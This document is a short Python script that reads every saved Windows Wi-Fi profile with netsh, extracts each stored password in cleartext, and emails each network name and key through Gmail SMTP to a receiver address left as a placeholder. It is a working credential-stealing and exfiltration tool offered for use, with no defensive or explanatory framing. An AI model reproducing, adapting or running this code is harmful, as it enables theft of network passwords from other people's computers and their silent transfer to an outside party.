import smtplib
import subprocess
print("""

                                        ######  ##     ## ########  
                                        ##    ## ##     ## ##     ## 
                                        ##       ##     ## ##     ## 
                                        ######  ######### ########  
                                            ## ##     ## ##     ## 
                                        ##    ## ##     ## ##     ## 
                                        ######  ##     ## ######## 
 
""")
data = subprocess.check_output(['netsh','wlan','show','profiles'])
data = data.decode('utf-8')
data = data.split('\n')
profiles = [i.split(':')[1][1:-1] for i in data if "All User Profile" in i]
for i in profiles:
    data1 = subprocess.check_output(['netsh','wlan','show','profiles',i,'key=clear'])
    data1 = data1.decode('utf-8')
    data1 = data1.split('\n')
    key = [f.split(':')[1][1:-1] for f in data1 if "Key Content" in f]
    try:
        b = "{} = {}".format(i,key[0])
    except IndexError:
        b = "{} = {}".format(i,"")
#If there is an error go to gmail-->security-->less secured app access-->ON
    smtpobj = smtplib.SMTP('smtp.gmail.com', 587)
    smtpobj.starttls()
    senderemail_id="YOUR EMAIL"
    senderemail_id_password="YOUR EMAIL PASSWORD"
    receiveremail_id="RECIEVER EMAIL"
    smtpobj.login(senderemail_id, senderemail_id_password)
    smtpobj.sendmail(senderemail_id,receiveremail_id, b)
    smtpobj.quit()
    print("DONE")
    pass